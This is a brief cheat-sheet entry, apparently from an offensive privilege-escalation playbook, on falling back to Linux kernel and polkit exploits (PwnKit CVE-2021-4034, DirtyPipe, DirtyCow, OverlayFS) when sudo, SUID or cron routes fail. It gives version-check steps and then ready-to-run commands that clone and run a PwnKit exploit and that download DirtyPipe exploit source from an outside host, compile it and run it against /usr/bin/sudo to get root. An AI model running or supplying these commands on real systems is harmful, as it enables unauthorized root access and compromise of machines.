# 12.03 Kernel PwnKit-class

> Fall back to DirtyCow, DirtyPipe, OverlayFS, or PwnKit (CVE-2021-4034) when sudo/SUID/cron paths fail — verify kernel/glibc/polkit first.

## Overview

When SUID/cron/sudo paths fail, fall back to kernel CVEs (DirtyCow, DirtyPipe, OverlayFS) or PwnKit (CVE-2021-4034). Always check kernel + glibc + polkit/pkexec versions first.

## Steps

- **uname -a; cat /etc/os-release** — kernel version.
- **ls -la /usr/bin/pkexec** — exists + SUID-root?
- **Compile in matching environment** — gcc on target if available.

## Commands

### PwnKit + DirtyPipe

```bash
git clone https://github.com/berdav/CVE-2021-4034 && cd CVE-2021-4034 && make && ./cve-2021-4034
wget https://haxx.in/files/dirtypipez.c && gcc dirtypipez.c -o dp && ./dp /usr/bin/sudo
```
